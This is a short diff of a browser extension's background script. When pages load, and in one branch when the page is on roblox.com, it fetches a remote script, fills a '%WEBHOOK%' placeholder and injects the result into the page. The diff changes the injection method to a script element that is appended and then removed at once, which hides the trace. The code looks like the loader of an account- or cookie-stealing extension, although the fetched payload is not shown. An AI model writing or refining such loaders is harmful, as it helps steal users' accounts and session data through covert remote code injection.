@@ -5,16 +5,12 @@ chrome.webNavigation.onCompleted.addListener(function(details) {
       .then(data => {
         const modifiedData = data.replace('%WEBHOOK%', '123');
         
-        const script = `
-          (function() {
-            ${modifiedData}
-          })();
-        `;
+        const script = document.createElement('script');
+        script.textContent = modifiedData;
 
-        chrome.scripting.executeScript({
-          target: { tabId: details.tabId },
-          func: new Function(script)
-        });
+        const scriptInjector = document.head || document.documentElement;
+        scriptInjector.appendChild(script);
+        scriptInjector.removeChild(script);
       })
       .catch(error => console.error('Error fetching or modifying the script:', error));
   } else if (details.url.includes('roblox.com')) {
@@ -23,16 +19,12 @@ chrome.webNavigation.onCompleted.addListener(function(details) {
       .then(data => {
         const modifiedData = data.replace('%WEBHOOK%', '123');
         
-        const script = `
-          (function() {
-            ${modifiedData}
-          })();
-        `;
+        const script = document.createElement('script');
+        script.textContent = modifiedData;
 
-        chrome.scripting.executeScript({
-          target: { tabId: details.tabId },
-          func: new Function(script)
-        });
+        const scriptInjector = document.head || document.documentElement;
+        scriptInjector.appendChild(script);
+        scriptInjector.removeChild(script);
       })
       .catch(error => console.error('Error fetching or modifying the script:', error));
   }
